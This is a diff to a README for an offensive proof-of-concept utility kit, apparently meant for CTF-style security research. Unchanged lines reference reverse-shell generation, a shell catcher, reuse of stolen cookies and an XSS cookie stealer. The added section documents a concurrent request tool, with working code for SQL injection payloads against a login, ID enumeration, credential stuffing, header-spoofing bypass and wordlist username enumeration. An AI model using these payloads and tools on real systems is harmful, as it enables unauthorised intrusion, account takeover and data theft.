@@ -2,7 +2,7 @@
 
 Quick reference for all utilities included in this POC template. These are designed for **speed and simplicity** in security research.
 
-## 🎨 Colored Output (`utils/output.py`)
+## Colored Output (`utils/output.py`)
 
 Better visibility for your exploit output:
 
@@ -17,7 +17,7 @@ out.status("Extracting data...")       # [...] Cyan
 out.debug("Response: 200 OK")          # [DEBUG] Magenta
 ```
 
-## 🐚 Reverse Shells (`utils/reverse_shells.py`)
+## Reverse Shells (`utils/reverse_shells.py`)
 
 Generate reverse shells dynamically with proper LHOST/LPORT:
 
@@ -40,7 +40,7 @@ quick_python(args.lhost, 4444)   # Prints download instructions
 
 Serve shells at: `http://YOUR-IP:8000/shells/rev_bash.sh`
 
-## 🎣 Shell Catcher (`utils/shell_catcher.py`)
+## Shell Catcher (`utils/shell_catcher.py`)
 
 Catch reverse shells directly in Python - no need for separate netcat!
 
@@ -76,7 +76,7 @@ quick_catch(4444, trigger_func=trigger)   # Does everything automatically
 - Tab completion (after stabilization)
 - Raw TTY mode for full interactivity
 
-## 🍪 Cookie Handling (`utils/cookie.py`)
+## Cookie Handling (`utils/cookie.py`)
 
 Parse stolen cookies for reuse:
 
@@ -96,7 +96,7 @@ cookies = parse_cookie_string(cookie_str)
 response = requests.get(target_url, cookies=cookies)
 ```
 
-## 🌐 Server Hooks (`utils/server_hooks.py`)
+## Server Hooks (`utils/server_hooks.py`)
 
 Get data from your callback server's queue:
 
@@ -116,7 +116,7 @@ event = get_event()  # {'type': 'cookie', 'data': '...', 'timestamp': '...'}
 drain_queue()
 ```
 
-## 📁 Paths (`utils/paths.py`)
+## Paths (`utils/paths.py`)
 
 Consistent access to project directories:
 
@@ -134,7 +134,7 @@ ensure_dirs_exist()
 server_log = get_log_file('server.ndjson')
 ```
 
-## 🔐 Encoding (`utils/encoding.py`)
+## Encoding (`utils/encoding.py`)
 
 Common encoding/decoding operations:
 
@@ -159,7 +159,7 @@ safe_html = html_encode("<script>")
 unsafe = html_decode("&lt;script&gt;")
 ```
 
-## 🌍 Network (`utils/network.py`)
+## Network (`utils/network.py`)
 
 Network utilities for callbacks:
 
@@ -175,7 +175,7 @@ lhost = get_callback_host()
 # Returns: '10.10.16.2' (or best available)
 ```
 
-## ⏱️ Timing (`utils/timing.py`)
+## Timing (`utils/timing.py`)
 
 Timing utilities for blind exploitation:
 
@@ -191,7 +191,7 @@ if duration > 5:
     out.success("Vulnerable to time-based SQLi!")
 ```
 
-## 🚀 Common POC Patterns
+## Common POC Patterns
 
 ### XSS Cookie Stealer
 ```python
@@ -269,14 +269,100 @@ def trigger():
 quick_catch(4444, trigger_func=trigger)
 ```
 
-## 💡 Tips
+## Batch Requests (`utils/batch_request.py`)
+
+Intruder-like functionality for testing multiple payloads:
+
+```python
+import httpx
+from utils.batch_request import (
+    batch_request_sync,
+    generate_param_payloads,
+    generate_json_payloads,
+    generate_data_payloads,
+    generate_header_payloads
+)
+
+# Build base request with common parameters
+client = httpx.Client()
+base = client.build_request(
+    "POST",
+    "http://target/api/login",
+    json={"username": "test", "password": "test"},
+    headers={"X-API-Key": "secret"}
+)
+
+# Test SQL injection
+sqli_payloads = ["' OR '1'='1", "admin'--", "' UNION SELECT NULL--"]
+results = batch_request_sync(
+    base,
+    payloads=generate_json_payloads("username", sqli_payloads),
+    validate=lambda r: "dashboard" in r.text or r.status_code == 302,
+    concurrency=5,  # 5 requests at a time
+    proxy="http://127.0.0.1:8080"  # Debug via Burp
+)
+
+# Find successful payloads
+for r in results:
+    if r.matched:
+        out.success(f"Valid payload: {r.payload}")
+
+# Enumerate IDs
+results = batch_request_sync(
+    client.build_request("GET", "http://target/api/user"),
+    payloads=generate_param_payloads("id", range(1, 1000)),
+    validate=lambda r: r.status_code == 200,
+    concurrency=50  # Fast enumeration
+)
+
+# Credential stuffing
+creds = [
+    {"username": "admin", "password": "admin"},
+    {"username": "root", "password": "root"},
+]
+results = batch_request_sync(
+    base,
+    payloads=[{"json": cred} for cred in creds],
+    validate=lambda r: "success" in r.text,
+    concurrency=3  # Be gentle with login endpoints
+)
+
+# Header injection testing
+results = batch_request_sync(
+    client.build_request("GET", "http://target/"),
+    payloads=generate_header_payloads("X-Forwarded-For",
+                                     ["127.0.0.1", "localhost", "::1"]),
+    validate=lambda r: "admin" in r.text
+)
+
+# Memory-efficient scanning (for large wordlists)
+with open("wordlist.txt") as f:
+    wordlist = [line.strip() for line in f]
+
+# Only get successful results, drop response bodies
+valid_users = batch_request_sync(
+    client.build_request("GET", "http://target/api/user"),
+    payloads=generate_param_payloads("username", wordlist),
+    validate=lambda r: r.status_code == 200,
+    concurrency=100,
+    filter_matched=True,  # Only return valid usernames
+    drop_response=True    # Don't store response bodies (saves memory)
+)
+
+# Now valid_users only contains successful payloads
+for result in valid_users:
+    out.success(f"Valid user: {result.payload['params']['username']}")
+```
+
+## Tips
 
 1. **Always use colored output** - Makes exploits much easier to debug
 2. **Use shell_catcher** instead of netcat - Get PTY upgrade automatically
 3. **Generate shells on-demand** - Don't hardcode LHOST/LPORT
 4. **Keep it simple** - These utils prioritize speed over perfection
+5. **Use batch_request for fuzzing** - Test multiple payloads efficiently with concurrency control
 
-## 🏃 Quick Start Checklist
+## Quick Start Checklist
 
 ```bash
 # 1. Start your server (in separate terminal)
